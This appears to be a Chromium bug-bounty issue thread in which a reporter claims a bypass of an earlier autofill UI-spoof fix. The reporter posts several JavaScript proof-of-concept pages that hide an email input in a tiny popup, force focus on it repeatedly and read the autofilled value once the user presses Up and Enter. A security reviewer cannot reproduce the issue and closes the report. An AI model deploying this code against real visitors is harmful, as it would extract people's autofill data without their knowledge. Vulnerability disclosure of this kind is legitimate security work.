@@ -1,0 +1,615 @@
+Issue ID: 442952272
+
+Author: bu...@google.com
+<p>I created a focused PoC that forces a hidden input[autocomplete=email] in a small popup and repeatedly focuses it. When the browser’s autofill popup is clipped/obscured by the browser chrome, keyboard selection (Up + Enter) still selects the autofill entry. The PoC then displays the selected value inside the popup (visible in the recorded video).</p>
+<p>Steps to reproduce, test environment, and a short screen recording are attached. This demonstrates data exposure (autofill value selected) while the suggestion was not visible to the user, which I believe crosses from cosmetic clipping into a data-exfiltration risk.</p>
+<p>How to run (quick)</p>
+<ul>
+<li>Save file as <code>autofill_hidden_poc.html</code></li>
+<li>Serve it from a local server:
+<code>python3 -m http.server 8000</code> in the folder, open <code>http://localhost:8000/autofill_hidden_poc.html</code>.</li>
+<li>open it in chrome</li>
+<li><code>Click Open popup PoC</code> The small popup will appear.</li>
+<li>In the popup press Up Arrow then Enter.</li>
+<li>The popup will show a line Hidden input value selected: <span>&lt;your-test-email&gt;</span> even when you couldn’t see the dropdown option.</li>
+</ul>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;
+  &lt;<span class="stx-keyword">meta</span> charset=<span class="stx-string">&quot;utf-8&quot;</span> /&gt;
+  &lt;<span class="stx-keyword">title</span>&gt;[Bypass] Autofill UI Spoof leaking emails - Chrome&lt;/<span class="stx-keyword">title</span>&gt;
+  &lt;<span class="stx-keyword">style</span>&gt;
+    body { font-family: sans-serif; padding: <span class="stx-number">20</span>px; }
+    button { font-size: <span class="stx-number">16</span>px; padding: <span class="stx-number">8</span>px <span class="stx-number">12</span>px; }
+    .note { margin-top: <span class="stx-number">12</span>px; color: #<span class="stx-number">444</span>; }
+  &lt;/<span class="stx-keyword">style</span>&gt;
+&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+  &lt;<span class="stx-keyword">h2</span>&gt;[Bypass] Autofill UI Spoof leaking emails - Chrome&lt;/<span class="stx-keyword">h2</span>&gt;
+  &lt;<span class="stx-keyword">p</span>&gt;
+    This will open a small popup window with a hidden email input.
+    Follow the steps below to reproduce the issue.
+  &lt;/<span class="stx-keyword">p</span>&gt;
+
+  &lt;<span class="stx-keyword">ol</span>&gt;
+    &lt;<span class="stx-keyword">li</span>&gt;Open this poc in Chrome - Version <span class="stx-number">140.0</span>.<span class="stx-number">7339.81</span> (Official Build) (<span class="stx-number">64</span>-bit)&lt;/<span class="stx-keyword">li</span>&gt;
+    &lt;<span class="stx-keyword">li</span>&gt;Click the button below to open the popup.&lt;/<span class="stx-keyword">li</span>&gt;
+    &lt;<span class="stx-keyword">li</span>&gt;In the popup, follow the on-screen instruction and press: &lt;<span class="stx-keyword">b</span>&gt;Up Arrow&lt;/<span class="stx-keyword">b</span>&gt; then &lt;<span class="stx-keyword">b</span>&gt;Enter&lt;/<span class="stx-keyword">b</span>&gt;.&lt;/<span class="stx-keyword">li</span>&gt;
+    &lt;<span class="stx-keyword">li</span>&gt;The PoC will show whether the hidden autofill value was selected.&lt;/<span class="stx-keyword">li</span>&gt;
+  &lt;/<span class="stx-keyword">ol</span>&gt;
+
+  &lt;<span class="stx-keyword">button</span> id=<span class="stx-string">&quot;open&quot;</span>&gt;Open popup PoC&lt;/<span class="stx-keyword">button</span>&gt;
+  &lt;<span class="stx-keyword">div</span> class=<span class="stx-string">&quot;note&quot;</span>&gt;We can see that the dropdown is off/hidden, and that pressing keys selects a hidden value.&lt;/<span class="stx-keyword">div</span>&gt;
+
+&lt;<span class="stx-keyword">script</span>&gt;
+document.getElementById(<span class="stx-string">&#39;open&#39;</span>).addEventListener(<span class="stx-string">&#39;click&#39;</span>, () =&gt; {
+  // Open a small popup
+  const w = window.open(<span class="stx-string">&#39;&#39;</span>, <span class="stx-string">&#39;&#39;</span>, <span class="stx-string">&#39;width=250,height=150,left=100,top=100&#39;</span>);
+
+  // Basic HTML for the popup. No eval, no external scripts.
+  const html = `
+    &lt;!doctype html&gt;
+    &lt;<span class="stx-keyword">html</span>&gt;
+      &lt;<span class="stx-keyword">head</span>&gt;
+        &lt;<span class="stx-keyword">meta</span> charset=<span class="stx-string">&quot;utf-8&quot;</span>&gt;
+        &lt;<span class="stx-keyword">title</span>&gt;Popup&lt;/<span class="stx-keyword">title</span>&gt;
+        &lt;<span class="stx-keyword">style</span>&gt;
+          body { font-family: sans-serif; margin: <span class="stx-number">8</span>px; }
+          p { margin: <span class="stx-number">6</span>px <span class="stx-number">0</span>; }
+          .hint { font-weight: bold; color: #b<span class="stx-number">00</span>; }
+        &lt;/<span class="stx-keyword">style</span>&gt;
+      &lt;/<span class="stx-keyword">head</span>&gt;
+      &lt;<span class="stx-keyword">body</span>&gt;
+        &lt;<span class="stx-keyword">p</span> class=<span class="stx-string">&quot;hint&quot;</span>&gt;Please press &lt;<span class="stx-keyword">kbd</span>&gt;↑&lt;/<span class="stx-keyword">kbd</span>&gt; then &lt;<span class="stx-keyword">kbd</span>&gt;Enter&lt;/<span class="stx-keyword">kbd</span>&gt; now.&lt;/<span class="stx-keyword">p</span>&gt;
+        &lt;<span class="stx-keyword">p</span> style=<span class="stx-string">&quot;font-size:12px;color:#666&quot;</span>&gt;If the Autofill UI is clipped/hidden by the browser chrome, this demonstrates the issue.&lt;/<span class="stx-keyword">p</span>&gt;
+      &lt;/<span class="stx-keyword">body</span>&gt;
+    &lt;/<span class="stx-keyword">html</span>&gt;
+  `;
+
+  // write controlled content into the popup
+  w.document.open();
+  w.document.write(html);
+  w.document.close();
+
+  // Create the hidden input and the logging area through DOM API which avoid CSP/trusted types issues
+  // Delay a little so popup document is ready
+  setTimeout(() =&gt; {
+    try {
+      const doc = w.document;
+
+      // Create a visible area for proof (so you can see the captured value)
+      const log = doc.createElement(<span class="stx-string">&#39;div&#39;</span>);
+      log.id = <span class="stx-string">&#39;log&#39;</span>;
+      doc.body.appendChild(log);
+
+      // The hidden input that will receive autofill
+      const input = doc.createElement(<span class="stx-string">&#39;input&#39;</span>);
+      input.type = <span class="stx-string">&#39;email&#39;</span>;
+      input.autocomplete = <span class="stx-string">&#39;email&#39;</span>;
+      input.name = <span class="stx-string">&#39;email&#39;</span>;
+      input.setAttribute(<span class="stx-string">&#39;id&#39;</span>, <span class="stx-string">&#39;hiddenEmail&#39;</span>);
+
+      // Make invisible but focusable
+      input.style.opacity = <span class="stx-string">&#39;0&#39;</span>;
+      input.style.position = <span class="stx-string">&#39;absolute&#39;</span>;
+      input.style.left = <span class="stx-string">&#39;10px&#39;</span>;
+      input.style.top = <span class="stx-string">&#39;60px&#39;</span>;
+      input.style.width = <span class="stx-string">&#39;1px&#39;</span>;
+      input.style.height = <span class="stx-string">&#39;1px&#39;</span>;
+      input.style.border = <span class="stx-string">&#39;0&#39;</span>;
+      input.tabIndex = <span class="stx-number">0</span>;
+
+      // Prevent mouse from interfering
+      doc.addEventListener(<span class="stx-string">&#39;mousedown&#39;</span>, (e) =&gt; { e.preventDefault(); }, true);
+
+      // When autofill completes, onchange fires. Show result for proof.
+      input.addEventListener(<span class="stx-string">&#39;change&#39;</span>, (ev) =&gt; {
+        const val = ev.target.value;
+        // show in popup (so screen-recording proof)
+        const p = doc.createElement(<span class="stx-string">&#39;p&#39;</span>);
+        p.style.color = <span class="stx-string">&#39;green&#39;</span>;
+        p.textContent = <span class="stx-string">&#39;Hidden input value selected: &#39;</span> + val;
+        log.appendChild(p);
+        // Also send to opener window console for quick debugging.
+        try { window.console.log(<span class="stx-string">&#39;POC selected value:&#39;</span>, val); } catch(e){}
+      });
+
+      doc.body.appendChild(input);
+
+      // Repeatedly focus input to encourage autofill display
+      // interval kept moderate to avoid spamming browser
+      const focuser = w.setInterval(() =&gt; {
+        try {
+          input.focus({preventScroll: true});
+        } catch (e) {
+          // ignore focus errors
+        }
+      }, <span class="stx-number">700</span>);
+
+      // Add a small close button so experimenter can close popup
+      const closeBtn = doc.createElement(<span class="stx-string">&#39;button&#39;</span>);
+      closeBtn.textContent = <span class="stx-string">&#39;Close popup&#39;</span>;
+      closeBtn.style.display = <span class="stx-string">&#39;block&#39;</span>;
+      closeBtn.style.marginTop = <span class="stx-string">&#39;8px&#39;</span>;
+      closeBtn.addEventListener(<span class="stx-string">&#39;click&#39;</span>, () =&gt; {
+        w.clearInterval(focuser);
+        try { w.close(); } catch(e){}
+      });
+      log.appendChild(closeBtn);
+
+      // Focus once immediately
+      setTimeout(() =&gt; {
+        try { input.focus({preventScroll:true}); } catch(e){}
+      }, <span class="stx-number">150</span>);
+
+      // End setup
+    } catch (err) {
+      alert(<span class="stx-string">&#39;Popup setup failed: &#39;</span> + err);
+    }
+  }, <span class="stx-number">150</span>);
+});
+&lt;/<span class="stx-keyword">script</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+
+Author: bu...@google.com
+<p><strong>Summary:</strong> [Bypass] Autofill UI Spoof leaking emails</p>
+<p><strong>Program:</strong> Google VRP</p>
+<p><strong>URL:</strong> chrome://settings/</p>
+<p><strong>Vulnerability type:</strong> Information Leak</p>
+<h3>Details</h3>
+<h2>[Bypass] Autofill UI Spoof leaking emails</h2>
+<p>hello i have found an bypass for <a href="https://chromium-review.googlesource.com/c/chromium/src/+/3525299" data-b-widget="url" data-b-original-href="https://chromium-review.googlesource.com/c/chromium/src/+/3525299" data-b-redirected-href="https://www.google.com/url?q=https://chromium-review.googlesource.com/c/chromium/src/%2B/3525299&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UAQATsgBqZqgJATIx8hJ_">https://chromium-review.googlesource.com/c/chromium/src/+/3525299</a>, first i tried on latest version <code>**Google Chrome Version:** Version 139.0.7258.155 (Official Build) (64-bit)</code> it worked but later the chrome got update <code>Version 140.0.7339.81 (Official Build) (64-bit)</code> now on this version this poc doesnt seem to work</p>
+<p>first reported here: <a href="https://chromium-review.googlesource.com/c/chromium/src/+/3525299" data-b-widget="url" data-b-original-href="https://chromium-review.googlesource.com/c/chromium/src/+/3525299" data-b-redirected-href="https://www.google.com/url?q=https://chromium-review.googlesource.com/c/chromium/src/%2B/3525299&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UAQATsgBqZqgJATIx8hJ_">https://chromium-review.googlesource.com/c/chromium/src/+/3525299</a>
+and poc found here <a href="https://ndevtk.github.io/writeups/2022/06/05/autofill/" data-b-widget="url" data-b-original-href="https://ndevtk.github.io/writeups/2022/06/05/autofill/" data-b-redirected-href="https://www.google.com/url?q=https://ndevtk.github.io/writeups/2022/06/05/autofill/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Y2pcQpZPvMTUKGVEKOGu6">https://ndevtk.github.io/writeups/2022/06/05/autofill/</a> which is not working for latest chrome version so we can create new poc, i have given it in report:</p>
+<pre><code><span class="stx-keyword">let</span> <span>w</span> = window.open(<span class="stx-string">&#39;&#39;</span>, <span class="stx-string">&#39;&#39;</span>, <span class="stx-string">&#39;width=1,height=1&#39;</span>);
+w.resizeTo(<span class="stx-number">250</span>, <span class="stx-number">150</span>);
+w.eval(<span class="stx-string">`</span>
+<span class="stx-string">let input = document.createElement(&quot;input&quot;);</span>
+<span class="stx-string">input.type = &quot;email&quot;;</span>
+<span class="stx-string">input.autocomplete = &quot;email&quot;;</span>
+<span class="stx-string">input.name = &quot;email&quot;;</span>
+<span class="stx-string">input.size = &quot;1&quot;;</span>
+<span class="stx-string">input.style.opacity = &#39;0&#39;;</span>
+<span class="stx-string">input.onkeypress = e =&gt; {</span>
+<span class="stx-string">    e.preventDefault();</span>
+<span class="stx-string">}</span>
+<span class="stx-string">window.onmousedown = e =&gt; {</span>
+<span class="stx-string">    // ignore mouse clicks</span>
+<span class="stx-string">    e.preventDefault();</span>
+<span class="stx-string">}</span>
+<span class="stx-string">input.onchange = e =&gt; {</span>
+<span class="stx-string">    alert(e.srcElement.value);</span>
+<span class="stx-string">    e.srcElement.value = &quot;&quot;;</span>
+<span class="stx-string">}</span>
+<span class="stx-string">document.body.appendChild(input);</span>
+<span class="stx-string">setInterval(() =&gt; {</span>
+<span class="stx-string">    input.focus({preventScroll: true});</span>
+<span class="stx-string">}, 1000);</span>
+<span class="stx-string">`</span>);
+<span class="stx-keyword">let</span> <span>p</span> = document.createElement(<span class="stx-string">&#39;p&#39;</span>);
+p.innerText = <span class="stx-string">&#39;Please press the Up arrow then Enter :)&#39;</span>;
+w.document.body.appendChild(p);
+</code></pre>
+<p>and it was throwing this error which is expected since its patched this eror, it shows the eval inside the window.open().eval() is blocked because chrome pages chrome://resources enforce a strict CSP that disables unsafe-eval</p>
+<pre><code>VM46:<span class="stx-number">3</span> Uncaught EvalError: Refused to evaluate a <span class="stx-keyword">string</span> <span class="stx-keyword">as</span> JavaScript because <span class="stx-string">&#39;unsafe-eval&#39;</span> <span class="stx-keyword">is</span> not an allowed source <span class="stx-keyword">of</span> script <span class="stx-keyword">in</span> the following Content Security Policy directive: <span class="stx-string">&quot;script-src chrome://resources chrome://webui-test &#39;self&#39;&quot;</span>.
+
+    at eval (&lt;<span class="stx-keyword">anonymous</span>&gt;<span class="stx-string">)</span>
+<span class="stx-string">    at </span>&lt;<span class="stx-keyword">anonymous</span>&gt;<span class="stx-string">:3:3</span>
+</code></pre>
+<p>if we see the patch for this <code>chrome/browser/ui/views/autofill/autofill_popup_view_utils.cc</code> we see that, it changes the autofill popup positioning logic instead of incorrectly deciding <code>draw above to overlap URL bar</code> and it now checks the available space inside the content area and forces popup inside the viewport top and bottom, but never outside into reserved UI like the omnibox</p>
+<pre><code><span class="stx-comment">// As a fallback, render the popup on top of the element if there is more</span>
+<span class="stx-comment">// space than below the element.</span>
+<span class="stx-keyword">if</span> (element_bounds.y() - content_area_bounds.y() &gt;
+    content_area_bounds.bottom() - element_bounds.bottom()) {
+  <span class="stx-keyword">return</span> <span class="stx-qualifier">views</span>::<span class="stx-qualifier">BubbleArrowSide</span>::kBottom;
+}
+
+<span class="stx-keyword">return</span> views::BubbleArrowSide::kTop;
+}
+</code></pre>
+<p>so i think this patch did not cover the exact window geometry case or this has different code path and the <code>cl</code> fixed one placement bug but other positioning logic tiny windows, custom dpi scaling which may still allow it.</p>
+<p>The fix in CL 3525299 improves popup arrow positioning but assumes either <code>above</code> or <code>below</code> which will always be a valid option inside the viewport, in attacker-controlled small windows 250×150, both directions overflow which causing autofill to render into chrome ui so i think the patch does not suppress autofill for hidden inputs which has(opacity: 0, size=1) or prevent forced focus loops</p>
+<p>and attacker can still extract stored credentials by focusing hidden inputs and capturing autofill values, bypassing the intended patch, i could be wrong about this patch but the vulnerability sill reproducable in latest chrome version which should be concerned about</p>
+<p>now here is the real and working bypass poc for first patch or its just working as intended</p>
+<p>to use it simply copy console then you would be able to see an small popup window, go on that window and press the Up arrow then Enter or Down arrow then you would be able to see an email addreses now this could leak an more</p>
+<pre><code><span class="stx-keyword">let</span> <span>w</span> = window.open(<span class="stx-string">&#39;&#39;</span>, <span class="stx-string">&#39;&#39;</span>, <span class="stx-string">&#39;width=250,height=150&#39;</span>);
+
+
+<span class="stx-keyword">let</span> <span>input</span> = w.document.createElement(<span class="stx-string">&quot;input&quot;</span>);
+input.type = <span class="stx-string">&quot;email&quot;</span>;
+input.autocomplete = <span class="stx-string">&quot;email&quot;</span>;
+input.name = <span class="stx-string">&quot;email&quot;</span>;
+input.size = <span class="stx-string">&quot;1&quot;</span>;
+input.style.opacity = <span class="stx-string">&#39;0&#39;</span>;
+
+input.onkeypress = e =&gt; e.preventDefault();
+w.onmousedown = e =&gt; e.preventDefault();
+input.onchange = e =&gt; {
+    alert(e.srcElement.value);
+    e.srcElement.value = <span class="stx-string">&quot;&quot;</span>;
+};
+
+w.document.body.appendChild(input);
+
+
+w.setInterval(() =&gt; {
+    input.focus({<span>preventScroll</span>: <span class="stx-keyword">true</span>});
+}, <span class="stx-number">1000</span>);
+
+
+<span class="stx-keyword">let</span> <span>p</span> = w.document.createElement(<span class="stx-string">&#39;p&#39;</span>);
+p.innerText = <span class="stx-string">&#39;Please press the Up arrow then Enter :)&#39;</span>;
+w.document.body.appendChild(p);
+
+</code></pre>
+<p>so this worked because the patch only chooses top or bottom, if window is too small, both sides have very little space and popup still goes out of content area and overlaps omnibox so attacker can still trigger autofill suggestions with right window size.</p>
+<h2>References</h2>
+<ul>
+<li><a href="https://chromium-review.googlesource.com/c/chromium/src/+/3525299" data-b-widget="url" data-b-original-href="https://chromium-review.googlesource.com/c/chromium/src/+/3525299" data-b-redirected-href="https://www.google.com/url?q=https://chromium-review.googlesource.com/c/chromium/src/%2B/3525299&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0UAQATsgBqZqgJATIx8hJ_">https://chromium-review.googlesource.com/c/chromium/src/+/3525299</a></li>
+<li><a href="https://ndevtk.github.io/writeups/2022/06/05/autofill/" data-b-widget="url" data-b-original-href="https://ndevtk.github.io/writeups/2022/06/05/autofill/" data-b-redirected-href="https://www.google.com/url?q=https://ndevtk.github.io/writeups/2022/06/05/autofill/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Y2pcQpZPvMTUKGVEKOGu6">https://ndevtk.github.io/writeups/2022/06/05/autofill/</a></li>
+</ul>
+<h3>Attack scenario</h3>
+<ul>
+<li>Autofill data (email, username, pii) can be extracted by hidden input</li>
+<li>Works with only key presses, no direct user consent.</li>
+<li>Leads to information disclosure.</li>
+</ul>
+
+Author: bu...@google.com
+google_domain
+
+Author: pa...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: pa...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: pa...@gmail.com
+public_non_google
+
+Author: wo...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: wo...@google.com
+googlers_unrestricted
+
+Author: sp...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: sp...@google.com
+google_domain
+
+Author: sp...@google.com
+<p><em>NOTE: This is an automatically generated email</em></p>
+<p>Hi! Many thanks for sharing your report.</p>
+<p>This email confirms we&#39;ve received your message. We&#39;ll investigate the issue you&#39;ve reported and get back to you once we have an update. In the meantime, you might want to take a look at the <a href="https://bughunters.google.com/about/4925519884451840/frequently-asked-questions" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/4925519884451840/frequently-asked-questions" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/4925519884451840/frequently-asked-questions&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw19h8Z6ULf5_Ei7hYTDRgW2">list of frequently asked questions about Google Bug Hunters</a>.</p>
+<p>Also, if you have not already done so, create a profile on <a href="https://bughunters.google.com/" data-b-widget="url" data-b-original-href="https://bughunters.google.com/" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0dOCoMtWmTxwmFEahbqwNc">the Google Bughunters site</a> if you&#39;d like us to publicly recognize your contribution:</p>
+<ul>
+<li><a href="https://bughunters.google.com/leaderboard" data-b-widget="url" data-b-original-href="https://bughunters.google.com/leaderboard" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/leaderboard&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2v_UOS0zv2Tr-Pkpw22Kar">Leaderboard</a> – You&#39;ll be added here if we issue a reward for your report.</li>
+<li><a href="https://bughunters.google.com/leaderboard/honorable-mentions" data-b-widget="url" data-b-original-href="https://bughunters.google.com/leaderboard/honorable-mentions" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/leaderboard/honorable-mentions&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0l7-69qzYsspwCYtDbgz87">Honorable Mentions</a> – You&#39;ll be added here if you are not in the Hall of Fame, but we file a security vulnerability bug based on your report.</li>
+</ul>
+<p><strong>Note that we only act on reports concerning vulnerabilities or technical security problems in one of our products. This is not the correct channel if you need to resolve a problem with your account, or want to report non-security bugs or suggest a new product feature.</strong></p>
+<p>Good news! According to Google magic, your report is likely actionable for us, so it has been moved up in our queue by raising the priority. The next step is human expert review, which should happen slightly sooner now.</p>
+<p>Cheers, <br>
+Google Security Bot</p>
+<p><a href="https://twitter.com/googlevrp" data-b-widget="url" data-b-original-href="https://twitter.com/googlevrp" data-b-redirected-href="https://www.google.com/url?q=https://twitter.com/googlevrp&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1_A1dbgXAVKv12WeSpV0C-">Follow us</a> on Twitter!</p>
+
+Author: sp...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: po...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: po...@google.com
+googlers_unrestricted
+
+Author: po...@google.com
+<p>This report may qualify for the <a href="https://bughunters.google.com/about/rules/chrome-friends/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/chrome-friends/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/chrome-friends/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0kibILo1cWYGAbjyC2I3u4">Chrome Vulnerability Reward Program</a>. We are moving this report to the Chromium issue tracker.</p>
+
+Author: sp...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@google.com
+googlers_unrestricted
+
+Author: sp...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: ta...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ta...@google.com
+googlers_unrestricted
+
+Author: ku...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ku...@google.com
+googlers_unrestricted
+
+Author: ta...@google.com
+Tm1VNFptTTNNVGxtTkdJNU5EYzJZVEZoTnpNME9ERTNObVU1Wm1RNFlUQT0=
+
+Author: Hi kuchyn@, I know you were looking at a related issue recently. Could you please look at this as well?
+Tm1VNFptTTNNVGxtTkdJNU5EYzJZVEZoTnpNME9ERTNObVU1Wm1RNFlUQT0=
+
+Author: am...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: am...@chromium.org
+public_non_google
+
+Author: th...@chromium.org
+&gt; but later the chrome got update Version 140.0.7339.81 (Official Build) (64-bit) now on this version this poc doesnt seem to work<br><br>Reporter, can you confirm which versions of Chrome you are finding a bug that is reproducible by any POC you have?
+
+Author: th...@chromium.org
+public_non_google
+
+Author: th...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: th...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pa...@gmail.com
+<p>I have used this version</p>
+<pre><code>Google Chrome
+Chrome is up to date
+Version 140.0.7339.81 (Official Build) (64-bit)
+</code></pre>
+
+Author: pa...@gmail.com
+TkRReU9UVXlNamN5TFRZNU1EY3lOakUyTFMweE5UWXhNemszTVRJPQ==
+
+Author: pa...@gmail.com
+WVRkbE1USmhZVEkxWkRFM01HUmlObUZrWldZeU1EYzJOelV3TkdJelpUTT0=
+
+Author: pa...@gmail.com
+TkRReU9UVXlNamN5TFRZNU1EY3lOelUyTFRFNU5ESXhOVFkxTXpFPQ==
+
+Author: pe...@google.com
+<p>Thank you for providing more feedback. Adding the requester to the CC list.</p>
+
+Author: pe...@google.com
+google_domain
+
+Author: th...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ku...@google.com
+<p>Hi, I&#39;m fixing a similar <a href="https://issues.chromium.org/issues/430555440" data-b-widget="issue-reference" data-b-issue-id="430555440">b/430555440</a>, and I believe that the fix for that one will also fix this one. We&#39;ll have to wait until it&#39;s submitted and see</p>
+
+Author: pe...@google.com
+<p>The NextAction date has arrived: 2025-09-08
+To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the &quot;Chromium Labels&quot; custom field.</p>
+
+Author: th...@chromium.org
+[security shepherd]<br>I have tried the POC on M140 for Mac, Linux, and Windows, and I cannot reproduce a similar outcome as in the original bug this links to (<a href="https://www.google.com/url?q=https://crbug.com/40827331&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1rZLYffXfFd4So2SCJUYTV" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://crbug.com/40827331" data-b-redirected-href="https://www.google.com/url?q=https://crbug.com/40827331&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1rZLYffXfFd4So2SCJUYTV">https://crbug.com/40827331</a>).<br><br>The screenshots in that original bug show that the addresses were not visible. Whereas when I try to repro this, I can see the autofill information before pressing enter (see screenshot attached). The video in <a href="https://issues.chromium.org/issues/442952272#comment7" data-b-widget="issue-reference" data-b-issue-id="442952272" data-b-comment-number="7">#comment7</a> also does not show the autofill information being hidden, though the window is first expanded to a bigger size.<br><br>Reporter: Are you able to reproduce something that does not show the email addresses that are being selected? If so, could you please upload a video of that?
+
+Author: th...@chromium.org
+TkRReU9UVXlNamN5TFRZNU1UQTVNakl6TFRVeU9EZ3lOVGd6TXc9PQ==
+
+Author: pa...@gmail.com
+<p>the key detail of this issue is that the autofill popup should <strong>not</strong> be usable when it is rendered off screen or obscured</p>
+<ul>
+<li>In my PoC, if the popup is positioned so that it overlaps (or is partially hidden by) the browser UI, the email addresses are still selectable even though they should not be</li>
+</ul>
+<p>and</p>
+<ul>
+<li>On my setup windows 10 24H2 i can reproduce the case where the autofill suggestions appear “clipped” or not fully visible, but pressing the <strong>Up arrow</strong> then <strong>Enter</strong> still selects a hidden suggestion now this matches the condition from the original report: autofill was not meant to be accessible when hidden, but the popup logic <strong>deciding whether to render above or below the input</strong> makes it possible.</li>
+</ul>
+<p>also i have again recorded a short video showing:</p>
+<ol>
+<li>The small popup window where the autofill dropdown is <strong>not fully visible</strong></li>
+<li>That by pressing the arrow keys + Enter, I can still select an entry without the email being visually exposed</li>
+</ol>
+
+Author: pa...@gmail.com
+TkRReU9UVXlNamN5TFRZNU1USTVNalF4TFMweE16azJOell6TlRnNA==
+
+Author: th...@chromium.org
+[security shepherd]<br>Thanks for the response and for the report. Based on <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#What-makes-a-UI-spoof-interesting-to-report" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#What-makes-a-UI-spoof-interesting-to-report" data-b-redirected-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#What-makes-a-UI-spoof-interesting-to-report">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#What-makes-a-UI-spoof-interesting-to-report</a>, I do not consider the clipping to be a security issue. I am closing this issue out.
+
+Author: th...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: pa...@gmail.com
+<p>Thanks for the clarification and for linking the policy which i respect also i agree that simple clipping is normally cosmetic. However, in this case the impact goes beyond visual clipping even when the autofill dropdown is not visible to the user, it is still fully interactive via keyboard input (Up/Down + Enter) so this means a malicious page can trick a user into pressing keys  and the hidden autofill entry containing sensitive data like an email address gets inserted into the DOM without the user ever seeing what was selected and the sensitive value can then be read by JavaScript, effectively leaking autofill data without explicit user consent this isn’t just a cosmetic UI issue it’s a data exfiltration vector, Autofill data that should be protected behind user visibility/awareness can be programmatically extracted if the popup is clipped/hidden but still active that’s why i think this case still meets the bar described in the faq, it enables a site to trick a user into unintentionally disclosing sensitive data, would you reconsider with this framing? i can also provide a demo video showing the autofill entry being selected while it remains completely hidden from view, thanks again for your feedback</p>
+
+Author: th...@chromium.org
+&gt; i can also provide a demo video showing the autofill entry being selected while it remains completely hidden from view<br><br>If the autofill contents are completely hidden from view when the user is pressing the keys, that could be compelling. If that requires a new POC html file, could you please create a new report? If it is the same html file, you can just respond back here.
+
+Author: pa...@gmail.com
+<p>I created a focused PoC that forces a hidden input[autocomplete=email] in a small popup and repeatedly focuses it. When the browser’s autofill popup is clipped/obscured by the browser chrome, keyboard selection (Up + Enter) still selects the autofill entry. The PoC then displays the selected value inside the popup (visible in the recorded video).</p>
+<p>Steps to reproduce, test environment, and a short screen recording are attached. This demonstrates data exposure (autofill value selected) while the suggestion was not visible to the user, which I believe crosses from cosmetic clipping into a data-exfiltration risk.</p>
+<p>How to run (quick)</p>
+<ul>
+<li>Save file as <code>autofill_hidden_poc.html</code></li>
+<li>Serve it from a local server:
+<code>python3 -m http.server 8000</code> in the folder, open <code>http://localhost:8000/autofill_hidden_poc.html</code>.</li>
+<li>open it in chrome</li>
+<li><code>Click Open popup PoC</code> The small popup will appear.</li>
+<li>In the popup press Up Arrow then Enter.</li>
+<li>The popup will show a line Hidden input value selected: <span>&lt;your-test-email&gt;</span> even when you couldn’t see the dropdown option.</li>
+</ul>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;
+  &lt;<span class="stx-keyword">meta</span> charset=<span class="stx-string">&quot;utf-8&quot;</span> /&gt;
+  &lt;<span class="stx-keyword">title</span>&gt;[Bypass] Autofill UI Spoof leaking emails - Chrome&lt;/<span class="stx-keyword">title</span>&gt;
